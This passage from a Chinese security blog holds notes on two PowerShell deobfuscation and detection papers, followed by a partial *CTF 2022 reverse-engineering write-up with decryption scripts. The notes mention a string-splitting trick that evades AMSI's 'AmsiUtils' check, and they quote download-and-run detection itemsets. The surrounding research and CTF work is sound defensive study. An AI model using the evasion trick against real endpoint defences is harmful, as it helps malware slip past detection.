function是啥玩意，由于没看这3篇对应的论文，所以我也不知道是啥。。。等之后看了再回来弄吧)^获得未混淆的脚本，但是overriding function只能处理单层混淆。</p><p>PowerDecode设计了Unary Syntax Tree Model来处理多层混淆，所以他的效果要较好一点，但是如上面的Table II，他只能处理一部分混淆技术的混淆</p><p>Li 等人不能处理多层混淆。</p><p>‍</p><h3 id="行为一致性"><a href="#行为一致性" class="headerlink" title="行为一致性"></a>行为一致性</h3><p>为了量化分析，我们使用了行为一致性来代替语义的一致性。</p><p>为了简化分析，我们只比较了原始样本和去混淆后的样本的网络行为，比如DNS查询和TCP连接</p><p>使用TianQiong 沙盒来收集网络行为。</p><img src="/2022/11/15/paper2_Invoke-Deobfuscation/image-20221121205338-xiwwqa1.png" class="" title="image">​<h3 id="减轻混淆"><a href="#减轻混淆" class="headerlink" title="减轻混淆"></a>减轻混淆</h3><p>为了评估不同工具减轻复杂脚本上的混淆的能力，我们统计并比较原始样本和去混淆样本​中已知混淆技术的比例</p><p>选了3346个高混淆分数的样本，并且<a href="">限制</a>所有的工具，每个样本去混淆的时间为4分钟。</p><p>基于AST的可恢复节点和正则表达式，我们可以精确地识别每种已知的混淆技术</p><p>‍</p><img src="/2022/11/15/paper2_Invoke-Deobfuscation/image-20221121210228-ra0vdjy.png" class="" title="image">​<p>‍</p><h3 id="案例研究"><a href="#案例研究" class="headerlink" title="案例研究"></a>案例研究</h3><p>为了直观的比较和分析不同工具的去混淆效果，用不同工具去处理同一个样本，这个样本带有L1, L2, L3级别的混淆。</p><img src="/2022/11/15/paper2_Invoke-Deobfuscation/image-20221121210944-5wlqynv.png" class="" title="image"><img src="/2022/11/15/paper2_Invoke-Deobfuscation/image-20221121211247-u4g9735.png" class="" title="image"><h1 id="讨论"><a href="#讨论" class="headerlink" title="讨论"></a>讨论</h1><h2 id="语义一致性"><a href="#语义一致性" class="headerlink" title="语义一致性"></a>语义一致性</h2><p>现有工具的去混淆结果在语义上通常与其对应的混淆脚本不一致</p><p>正则表达式经常标识语法无效的脚本片段[16]-[18]，基于机器学习的分类器严重依赖于训练数据的质量[19]，预定义的恢复规则[16]–[18]和重写函数[16]，[18]只能处理一些特定的混淆。由于缺乏上下文，直接执行[18]、[19]可能会得到错误的恢复结果。</p><blockquote><p>[16] “Psdecode - powershell script for deobfuscating encoded powershell scripts,” <a href="https://github.com/R3MRUM/PSDecode">https://github.com/R3MRUM/PSDecode</a>.<br>[17] D. Ugarte, D. Maiorca, F. Cara, and G. Giacinto, “Powerdrive: Accurate de-obfuscation and analysis of powershell malware,” in Springer DIMVA, 2019.<br>[18] G. M. Malandrone, G. Virdis, G. Giacinto, and D. Maiorca, “Powerdecode: a powershell script decoder dedicated to malware analysis,” in ITASEC, 2021.<br>[19] Z. Li, Q. A. Chen, C. Xiong, Y . Chen, T. Zhu, and H. Yang, “Effective and light-weight deobfuscation and semantic-aware attack detection for powershell scripts,” in ACM CCS, 2019.</p></blockquote><p>Invoke-Deobfuscation利用令牌解析和AST的可恢复的节点，能够精确的识别混淆的片段，此外，在这个变量追踪的帮助下，Invoke-Deobfuscation能够以上下文感知的方法去恢复正确的结果。此外，Invoke Deobfuscation严格替换已混淆的脚本片段，以保持Deobfuscation脚本的语义一致。</p><h2 id="与AMSI比较"><a href="#与AMSI比较" class="headerlink" title="与AMSI比较"></a>与AMSI比较</h2><p>AMSI是 Windows反恶意软件扫描接口 (AMSI)</p><p>‍</p><p>ASMI是一个多功能的接口，它允许文件，内存，流扫描，URL/IP信誉检测和其他的检测[14]</p><blockquote><p>[14] “Antimalware scan interface (amsi),” <a href="https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal">https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal</a></p></blockquote><p>在提交给脚本引擎之前，这个脚本可能会经过若干层的去混淆。AMSI能够获得最终的提供给脚本引擎的脚本。</p><p>然而，此方法只能处理需要由InvokeExpression或PowerShell调用的特定类型的混淆</p><p>当这个混淆的脚本片段不需要被调用的时候，AMSI不能获得去混淆的片段，例如，AmsiUtils被AMSI对待为一个恶意的字符串，我们可以很容易的去绕过检测，比如”Amsi” + ‘Utils’</p><p>‍</p><p>尽管AMSI在处理许多混淆脚本上是很强大的，但是由于固有的机制，不同的混淆技术很容易绕过他</p><p>我们在虚拟机上运行前面IV-C2提到的100个PowerShell样本，并分析AMSI捕获的最终脚本，我们的分析标明，如第III-B4节所述，Invoke-Deobfuscation鱼油与AMSI相似的去混淆能力，除此之外，Invoke Deobfusion足够强大，可以处理不同的混淆技术</p><p>‍</p><h2 id="限制"><a href="#限制" class="headerlink" title="限制"></a>限制</h2><h3 id="变量追踪-1"><a href="#变量追踪-1" class="headerlink" title="变量追踪"></a>变量追踪</h3><p>放弃记录条件语句中的变量和循环语句中的变量</p><p>‍</p><h3 id="复杂混淆"><a href="#复杂混淆" class="headerlink" title="复杂混淆"></a>复杂混淆</h3><p>大多数的混淆数据和他们的相应的恢复算法都在相同的混淆片段里面，因此识别这些混淆片段并且执行就能够恢复原始的脚本片段。即使他们在不同的位置，我们也能够处理用变量追踪的方法去处理他们。</p><p>然而，如果攻击者把这个恢复算法放进了函数里，然后利用函数去恢复数据，则本文方法很难追踪这个混淆的链，甚至攻击者能够使用函数嵌套来反分析。</p><p>‍</p><h1 id="相关的工作"><a href="#相关的工作" class="headerlink" title="相关的工作"></a>相关的工作</h1><h2 id="检测恶意脚本"><a href="#检测恶意脚本" class="headerlink" title="检测恶意脚本"></a>检测恶意脚本</h2><p>最近，许多基于机器学习或者深度学习的恶意脚本检测模型已经提出来了，这些模型基于不同的特征对恶意样本进行分类，如文本[8]、[26]、[27]、令牌和AST节点特征[9]、[10]。</p><blockquote><p>[8] D. Hendler, S. Kels, and A. Rubin, “Detecting malicious powershell commands using deep neural networks,” in ASIACCS, 2018.</p><p>[9] G. Rusak, A. Al-Dujaili, and U.-M. O’Reilly, “Ast-based deep learning for detecting alicious powershell,” in ACM CCS, 2018.<br>[10] Y . Fang, X. Zhou, and C. Huang, “Effective method for detecting malicious powershell scripts based on hybrid features,” Neurocomputing, 2021.</p><p>[26] Choi, Sunoh, “Malicious powershell detection using attention against adversarial attacks,” Electronics, 2020.<br>[27] S. Choi, “Malicious powershell detection using graph convolution network,” Applied Sciences, 2021.</p></blockquote><p>因为混淆很容易改变这些特征，许多研究者提议检测混淆的样本</p><blockquote><p>[34] D. Bohannon and L. Holmes, “Revoke-obfuscation - powershell obfuscation detection framework,” <a href="https://github.com/danielbohannon/Revoke-Obfuscation">https://github.com/danielbohannon/Revoke-Obfuscation</a>.<br>[35] S. Aebersold, K. Kryszczuk, S. Paganoni, B. Tellenbach, and T. Trowbridge, “Detecting obfuscated javascripts using machine learning,” in ICIMP, 2016.<br>[36] M. Jodavi, M. Abadi, and E. Parhizkar, “Jsobfusdetector: A binary pso-based one-class classifier ensemble to detect obfuscated javascript code,”in IEEE AISP, 2015.</p></blockquote><p>但是混淆的样本和恶意的样本之间并没有直接的联系，所以，已经存在的检测方法去正确的检测混淆的恶意的PowerShell样本是非常困难的。</p><h2 id="混淆技术"><a href="#混淆技术" class="headerlink" title="混淆技术"></a>混淆技术</h2><h3 id="二进制混淆"><a href="#二进制混淆" class="headerlink" title="二进制混淆"></a>二进制混淆</h3><p>攻击者经常使用实时的加壳技术来混淆恶意代码并阻止静态分析。</p><p>‍</p><h3 id="脚本混淆"><a href="#脚本混淆" class="headerlink" title="脚本混淆"></a>脚本混淆</h3><p>各种混淆技术可以帮助恶意脚本逃避防病毒软件的检测[40]，[41]。Wang等人[42]提出了一种基于控制流转换的JavaScript代码混淆技术。有许多流行的混淆工具，例如Invoke Obfusion[12]、PowerSploit[43]、Empire[44]等，它们提供了丰富的混淆技术，如第II-B节所述。</p><blockquote><p>[40] W. Xu, F. Zhang, and S. Zhu, “The power of obfuscation techniques in malicious javascript code: A measurement study,” in IEEE MALWARE,2012.<br>[41] A. Balakrishnan and C. Schulze, “Code obfuscation literature survey,”CS701 Construction of compilers, 2005.<br>[42] Z. Y . Wang and W. M. Wu, “Technique of javascript code obfuscation based on control flow tansformations,” in AMM, 2014.<br>[43] “Powersploit - a powershell post-exploitation framework,” <a href="https://github.com/PowerShellMafia/PowerSploit">https://github.com/PowerShellMafia/PowerSploit</a>.<br>[44] “Empire - a powershell and python post-exploitation agent,” <a href="https://github.com/EmpireProject/Empire">https://github.com/EmpireProject/Empire</a>.</p><p>[12] D. Bohannon, “Invoke-obfuscation - powershell obfuscator,” <a href="https://github.com/danielbohannon/Invoke-Obfuscation">https://github.com/danielbohannon/Invoke-Obfuscation</a>.</p></blockquote><p>‍</p><h3 id="去混淆技术"><a href="#去混淆技术" class="headerlink" title="去混淆技术"></a>去混淆技术</h3><p>‍</p><p>常见的去混淆技术分为2种，动态分析和静态分析，动态分析通常在隔离环境中执行样本，并检测其行为[45]-[47]。它只能从脚本的行为推断脚本的意图，并且代码覆盖率很低</p><blockquote><p>[45] G. Lu, K. Coogan, and S. Debray, “Automatic simplification of obfus-<br>cated javascript code,” in IEEE ICISTM, 2012.<br>[46] B. Feinstein, D. Peck, and I. SecureWorks, “Caffeine monkey: Auto-<br>mated collection, detection and analysis of malicious javascript,” Black<br>Hat USA, 2007.<br>[47] U. Bayer, A. Moser, C. Kruegel, and E. Kirda, “Dynamic analysis of<br>malicious code,” Journal in Computer Virology, 2006</p></blockquote><p>静态分析需要识别混淆的数据和相应的恢复算法，这通常非常困难。</p><p>基于正则表达的工具，比如PSDecode [16], PowerDrive[17], PowerDecode [18]，他忽略了脚本片段的语法以至于他们不能精确的识别混淆片段。</p><p>Li等人[19] 利用基于机器学习的分类器和AST特征来识别混淆的脚本片段，然而，由于缺乏上下文环境和错误的替换，他们的工具方法经常遭遇语法错误和语义不一致， Invoke Deobfusion利用AST上的可恢复节点来识别混淆的片段，并实现变量跟踪以减轻上述挑战</p><p>‍</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>在本文中，我们提出了Invoke Deobfusion，这是第一个基于AST的、具有变量跟踪功能的保留语义的PowerShell脚本Deobfuscation工具。</p><p>Invoke-Deobfuscation使用AST的令牌和可恢复的节点来精确的识别模糊脚本片段，跟踪变量的值和范围，并模拟脚本片段的执行，以获得正确的恢复结果。</p><p>为了保持脚本的原始语义，Invoke Deobfusion严格处理替换。</p><p>我们的评估表明，Invoke Deobfusion在处理各种混淆技术、消除混淆有效性、保持脚本语义以及减轻野生样本混淆方面优于最先进的工具。</p><p>InvokeDeobfusion恢复的关键信息量是其他工具的两倍多，并且InvokeDeoBfusion的100%的Deobfuscation结果具有与原始样本相同的行为。</p><p>此外，Invoke-Deobfuscation能够减少野生样本混淆分数46%</p><p>‍</p><p>‍</p>]]></content>
      
      
      <categories>
          
          <category> 论文阅读 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> powershell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《Effective and Light-Weight Deobfuscation and Semantic-Aware Attack Detection for PowerShell Scripts》论文阅读</title>
      <link href="/2022/10/20/paper1_Effective/"/>
      <url>/2022/10/20/paper1_Effective/</url>
      
        <content type="html"><![CDATA[<h1 id="1-Effective-and-Light-Weight-Deobfuscation-and-Semantic-Aware-Attack-Detection-for-PowerShell-Scripts"><a href="#1-Effective-and-Light-Weight-Deobfuscation-and-Semantic-Aware-Attack-Detection-for-PowerShell-Scripts" class="headerlink" title="1. Effective and Light-Weight Deobfuscation and Semantic-Aware Attack Detection for PowerShell Scripts"></a>1. Effective and Light-Weight Deobfuscation and Semantic-Aware Attack Detection for PowerShell Scripts</h1><p>代码在 <a href="https://github.com/li-zhenyuan/Effective-and-Light-Weight-Deobfuscation-and-Semantic-Aware-Attack-Detection-for-PowerShell-Scripts">https://github.com/li-zhenyuan/Effective-and-Light-Weight-Deobfuscation-and-Semantic-Aware-Attack-Detection-for-PowerShell-Scripts</a></p><h2 id="主要工作"><a href="#主要工作" class="headerlink" title="主要工作"></a>主要工作</h2><ol><li>先基于子树去混淆（利用了机器学习识别混淆的子树）</li><li>利用OOA提取了恶意代码的语义规则然后进行检测</li></ol><p>‍</p><h2 id="POWERSHELL-DEOBFUSCATION"><a href="#POWERSHELL-DEOBFUSCATION" class="headerlink" title="POWERSHELL DEOBFUSCATION"></a>POWERSHELL DEOBFUSCATION</h2><img src="/2022/10/20/paper1_Effective/image-20221117210357-fak92pg.png" class="" title="image.png"><p>‍</p><p>处理混淆大体分为5个阶段</p><ol><li>把脚本文件解析为AST树（在解析的时候，对变量两端进行链接，在下面的第2步，第3步也这样操作）</li><li>用分类器识别混淆的子树（用到了机器学习， 混淆的子树并不都是可恢复的）</li><li>利用仿真器恢复混淆的片段</li><li>把第三步解混淆后的片段再弄成AST子树，替换进去</li><li>（1-4步循环，直到找不到混淆的子树）利用Post Processing模块把找不到混淆的那个最终的AST树再变成脚本文件</li></ol><p>‍</p><h3 id="1-Extract-Suspicious-Subtrees"><a href="#1-Extract-Suspicious-Subtrees" class="headerlink" title="1. Extract Suspicious Subtrees"></a>1. Extract Suspicious Subtrees</h3><p>因为在AST数中，只有2种方法传递恢复的片段给上层节点</p><ol><li>管道（pipe）</li><li>变量</li></ol><p>所以只检测2种类型的子树 <code>PipelineAst</code> 和 <code>AssignmentStatementAst</code>,称这2种子树为Suspicious Subtrees， 以广度优先的方式遍历AST， 并将可疑子树推送到堆栈中以进行后续步骤</p><p>‍</p><h3 id="2-Subtree-based-Obfuscation-Detection"><a href="#2-Subtree-based-Obfuscation-Detection" class="headerlink" title="2. Subtree-based Obfuscation Detection"></a>2. Subtree-based Obfuscation Detection</h3><p>基于机器学习的子树混淆检测。。</p><p>提出4种类型的特征</p><ol><li>Entropy of script pieces</li><li>Lengths of tokens</li><li>Distribution of AST types</li><li>Depth of AST</li></ol><h3 id="3-Emulation-based-Recovery"><a href="#3-Emulation-based-Recovery" class="headerlink" title="3. Emulation-based Recovery"></a>3. Emulation-based Recovery</h3><p>直接启动一个powershell进程，然后去执行，返回值就是易经恢复好的字符串</p><p>比如<code>​ (&quot;&#123;0&#125;&#123;1&#125;&quot; -f&#39;ie&#39;,&#39;x&#39;)</code>   –&gt; <code>iex</code></p><p>如果返回值不是字符串，说明上一步检测的这个子树有问题，即给这个子树标记为非混淆子树，然后继续跳过去分析下一个obfuscation-subtree</p><h3 id="4-AST-Update"><a href="#4-AST-Update" class="headerlink" title="4. AST Update"></a>4. AST Update</h3><p>当得到一个恢复的脚本片段的时候，将其变为AST（Recovered subtree）而且更新AST</p><p>这个过程主要有2步：</p><ol><li>将已经恢复的AST子树去替换掉刚才的可恢复的AST子树，并且修改这个子树的祖先的特征，以及把这个子树的所有的可疑子树推到堆栈中。</li><li>更新脚本片段，在子树的根节点位置存储具体的脚本片段，这个脚本片段应该被更新</li></ol><h3 id="5-Post-processing"><a href="#5-Post-processing" class="headerlink" title="5. Post processing"></a>5. Post processing</h3><p>‍</p><p>根据字符串之间的符号来进行后处理，比如</p><p><code>&quot;(&quot;DownloadFile&quot;).Invoke($url)&quot;</code>  因为有个<code>.Invoke</code> ，中间的<code>.</code>就说明<code>$url</code>是个参数，然后<code>DowloadFile</code>是个函数</p><p>‍</p><img src="/2022/10/20/paper1_Effective/image-20221118100815-6kamx6l.png" class="" title="image.png"><p>‍</p><h2 id="SEMANTIC-AWARE-POWERSHELL-ATTACK-DETECTION"><a href="#SEMANTIC-AWARE-POWERSHELL-ATTACK-DETECTION" class="headerlink" title="SEMANTIC-AWARE POWERSHELL ATTACK DETECTION"></a>SEMANTIC-AWARE POWERSHELL ATTACK DETECTION</h2><p>‍</p><img src="/2022/10/20/paper1_Effective/image-20221118101510-3ndilmu.png" class="" title="image.png"><p>检测系统主要是处理API集合，然后主要分为2个阶段， 训练阶段和检测阶段</p><h3 id="Training-Phase"><a href="#Training-Phase" class="headerlink" title="Training Phase"></a>Training Phase</h3><p>先根据前面提到的AST子树去针对  <code>InvokeMemberExpressionAst、CommandAst等</code> 提取一些itemsets，比如 <code>&#123;’new-object’, ’downloadfile’, ’start-process’&#125;</code>就是一个itemset</p><p>然后用一个 classic classification based on OOA mining 去对分析出来的itemsets进行操作</p><ol><li>首先用FP-Growth算法来生成frequent patterns，比如{z, r}, {z,x,y,t}这种</li><li>选择<strong>满足条件</strong>​的patterns来作为OOA rules</li></ol><p>满足什么条件呢？这里用到了2个数据，一个支持度，一个置信度</p><blockquote><p>至于支持度、置信度是什么？可以看下面2个文章</p><p><a href="https://blog.csdn.net/wo334499/article/details/51698810">https://blog.csdn.net/wo334499/article/details/51698810</a></p><p><a href="https://blog.csdn.net/cnweike/article/details/7311468">https://blog.csdn.net/cnweike/article/details/7311468</a></p></blockquote><p>‍</p><p>$support(I, Obj) = \frac { count(I\cup{ Obj}, DB) } {|DB|}$​</p><p>$confidence(I, Obj)= \frac { count(I\cup{ Obj}, DB) } {count(I, DB)}$​</p><p>‍</p><p>根据图8，{z, r}的支持度为 2(即是{z,r}， 又是恶意的) / 5 = 0.4</p><p>{z, r}的置信度为 2 / 2 = 1</p><p>{z,x,y,t}的支持度是 1 / 5 = 0.2  <strong>（不知道为啥论文这里是0.6，我怀疑是不是写错了？？？？）</strong>​</p><p>{z,x,y,t}的置信度是 1 / 3 = 0.33</p><p>‍</p><p>如果是支持度 &gt; 0.2 且 置信度 &gt;0.9,,则把它放到OOA规则中</p><p>‍</p><p>最终提取了31个OOA规则，典型的一些列在下图</p><img src="/2022/10/20/paper1_Effective/image-20221118112316-r47q397.png" class="" title="image.png"><h3 id="Detection-Phase"><a href="#Detection-Phase" class="headerlink" title="Detection Phase"></a>Detection Phase</h3><p>将脚本解析为itemsets，然后去匹配上一步训练好的OOA规则</p><p>‍</p><p>‍</p><p><strong>后面的评估部分之后再看</strong>​</p><p>‍</p>]]></content>
      
      
      <categories>
          
          <category> 论文阅读 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> powershell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022* CTF部分RE题目WP</title>
      <link href="/2022/04/17/statCTF_%E9%83%A8%E5%88%86RE_WP/"/>
      <url>/2022/04/17/statCTF_%E9%83%A8%E5%88%86RE_WP/</url>
      
        <content type="html"><![CDATA[<h1 id="2022-CTF部分RE题目WP"><a href="#2022-CTF部分RE题目WP" class="headerlink" title="2022* CTF部分RE题目WP"></a>2022* CTF部分RE题目WP</h1><h2 id="Simple-File-System"><a href="#Simple-File-System" class="headerlink" title="Simple File System"></a><strong>Simple File System</strong></h2><p>IDA打开程序进行分析</p><img src="/2022/04/17/statCTF_%E9%83%A8%E5%88%86RE_WP/image-20220417163232398.png" class="" title="image-20220417163232398"><p>instruction.txt的内容为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># instructions</span><br><span class="line"></span><br><span class="line">I implemented a very simple file system and buried my flag in it.</span><br><span class="line"></span><br><span class="line">The image file are initiated as follows: </span><br><span class="line">./simplefs image.flag 500</span><br><span class="line"> simplefs&gt; format</span><br><span class="line"> simplefs&gt; mount</span><br><span class="line"> simplefs&gt; plantflag</span><br><span class="line"> simplefs&gt; exit</span><br><span class="line"></span><br><span class="line">And you cold run &quot;help&quot; to explore other commands.</span><br></pre></td></tr></table></figure><p>程序逻辑是创建一个磁盘，格式化并挂载，然后将flag文件的内容加密后存储进去，只需要找到对应的加密函数写解密脚本即可</p><p>IDA找到plantflag处的代码</p><img src="/2022/04/17/statCTF_%E9%83%A8%E5%88%86RE_WP/image-20220417163339564.png" class="" title="image-20220417163339564"><p>这里的sub_216A函数的功能其实就是create_inode,v21，v22是2个随机数，而sub_1e16的第二个参数是不同的，进去分析</p><img src="/2022/04/17/statCTF_%E9%83%A8%E5%88%86RE_WP/image-20220417163631438.png" class="" title="image-20220417163631438"><p>发现sub_21B2才是真正的加密函数，在此函数下断点，把程序运行参数设置为imagetest.flag 500，IDA远程动态调试，运行并执行命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">simplefs&gt; format</span><br><span class="line">simplefs&gt; mount</span><br><span class="line">simplefs&gt; plantflag</span><br></pre></td></tr></table></figure><img src="/2022/04/17/statCTF_%E9%83%A8%E5%88%86RE_WP/image-20220417164027740.png" class="" title="image-20220417164027740"><p>调试发现V4的值一定是0xDEEDBEEF，观察imagetest.flag文件，发现从偏移0X33000开始存储，每隔0x1000存1个enc_flag，不过这些enc_flag只有1个是真正的通过sub_21b2函数进行加密的，其他的都是sub_2305中生成的随机数，所以不管它，直接把所有enc_flag执行一下解密函数就可以了。</p><p>exp为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ROR</span>(<span class="params">_num, _n</span>):</span></span><br><span class="line">    <span class="keyword">return</span> (((_num &gt;&gt; _n) &amp; <span class="number">0XFF</span>) | ((_num &lt;&lt; (<span class="number">8</span> - _n)) &amp; <span class="number">0XFF</span>)) &amp; <span class="number">0XFF</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dec</span>(<span class="params">a</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">        a[i] = ROR(a[i], <span class="number">3</span>)</span><br><span class="line">        a[i] ^= <span class="number">0xDE</span></span><br><span class="line">        a[i] = ROR(a[i], <span class="number">4</span>)</span><br><span class="line">        a[i] ^= <span class="number">0xED</span></span><br><span class="line">        a[i] = ROR(a[i], <span class="number">5</span>)</span><br><span class="line">        a[i] ^= <span class="number">0xBE</span></span><br><span class="line">        a[i] = ROR(a[i], <span class="number">6</span>)</span><br><span class="line">        a[i] ^= <span class="number">0xEF</span></span><br><span class="line">        a[i] = ROR(a[i], <span class="number">7</span>)</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./image.flag&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read()</span><br><span class="line">data_splitted = [<span class="built_in">list</span>(data[<span class="number">0x33000</span> + i * <span class="number">0x1000</span>: <span class="number">0x33000</span> + i * <span class="number">0x1000</span> + <span class="number">32</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> data <span class="keyword">in</span> data_splitted:</span><br><span class="line">    dec_data = <span class="built_in">bytes</span>(dec(data))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;*CTF&#x27;</span> <span class="keyword">in</span> dec_data:</span><br><span class="line">        <span class="built_in">print</span>(dec_data)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="string">b&#x27;*CTF&#123;Gwed9VQpM4Lanf0kEj1oFJR6&#125;\n*&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="NaCl"><a href="#NaCl" class="headerlink" title="NaCl"></a>NaCl</h2><p>IDA打开分析，测试是最终这2段数据进行对比，如果相同的话，flag就是*CTF{input}</p><img src="/2022/04/17/statCTF_%E9%83%A8%E5%88%86RE_WP/image-20220417200540628.png" class="" title="image-20220417200540628"><p>调试起来，发现了xtea算法</p><img src="/2022/04/17/statCTF_%E9%83%A8%E5%88%86RE_WP/image-20220417200600659.png" class="" title="image-20220417200600659"><p>最终经过无尽的调试，还原了题目算法</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LeftRotate(word, bits) ( (word) <span class="meta-string">&lt;&lt; (bits) | (word) &gt;</span>&gt; (32 - (bits)) )</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> dword_80AFB60[<span class="number">44</span>] = &#123;</span><br><span class="line"><span class="number">0x04050607</span>, <span class="number">0x00010203</span>, <span class="number">0x0C0D0E0F</span>, <span class="number">0x08090A0B</span>, <span class="number">0xCD3FE81B</span>, <span class="number">0xD7C45477</span>, <span class="number">0x9F3E9236</span>, <span class="number">0x0107F187</span>,</span><br><span class="line"><span class="number">0xF993CB81</span>, <span class="number">0xBF74166C</span>, <span class="number">0xDA198427</span>, <span class="number">0x1A05ABFF</span>, <span class="number">0x9307E5E4</span>, <span class="number">0xCB8B0E45</span>, <span class="number">0x306DF7F5</span>, <span class="number">0xAD300197</span>,</span><br><span class="line"><span class="number">0xAA86B056</span>, <span class="number">0x449263BA</span>, <span class="number">0x3FA4401B</span>, <span class="number">0x1E41F917</span>, <span class="number">0xC6CB1E7D</span>, <span class="number">0x18EB0D7A</span>, <span class="number">0xD4EC4800</span>, <span class="number">0xB486F92B</span>,</span><br><span class="line"><span class="number">0x8737F9F3</span>, <span class="number">0x765E3D25</span>, <span class="number">0xDB3D3537</span>, <span class="number">0xEE44552B</span>, <span class="number">0x11D0C94C</span>, <span class="number">0x9B605BCB</span>, <span class="number">0x903B98B3</span>, <span class="number">0x24C2EEA3</span>,</span><br><span class="line"><span class="number">0x896E10A2</span>, <span class="number">0x2247F0C0</span>, <span class="number">0xB84E5CAA</span>, <span class="number">0x8D2C04F0</span>, <span class="number">0x3BC7842C</span>, <span class="number">0x1A50D606</span>, <span class="number">0x49A1917C</span>, <span class="number">0x7E1CB50C</span>,</span><br><span class="line"><span class="number">0xFC27B826</span>, <span class="number">0x5FDDDFBC</span>, <span class="number">0xDE0FC404</span>, <span class="number">0xB2B30907</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">DWORD xtea_key[<span class="number">4</span>] = &#123; <span class="number">0x03020100</span>, <span class="number">0x07060504</span>, <span class="number">0x0B0A0908</span>, <span class="number">0x0F0E0D0C</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//xtea算法</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">encipher</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> num_rounds, DWORD v[<span class="number">2</span>], DWORD  key[<span class="number">4</span>])</span> </span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> i;</span><br><span class="line">DWORD v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>], sum = <span class="number">0</span>, delta = <span class="number">0x10325476</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; num_rounds; i++) &#123;</span><br><span class="line">v0 += (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (sum + key[sum &amp; <span class="number">3</span>]);</span><br><span class="line">sum += delta;</span><br><span class="line">v1 += (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (sum + key[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line">v[<span class="number">0</span>] = v0; v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">enc11</span><span class="params">(DWORD* v)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span 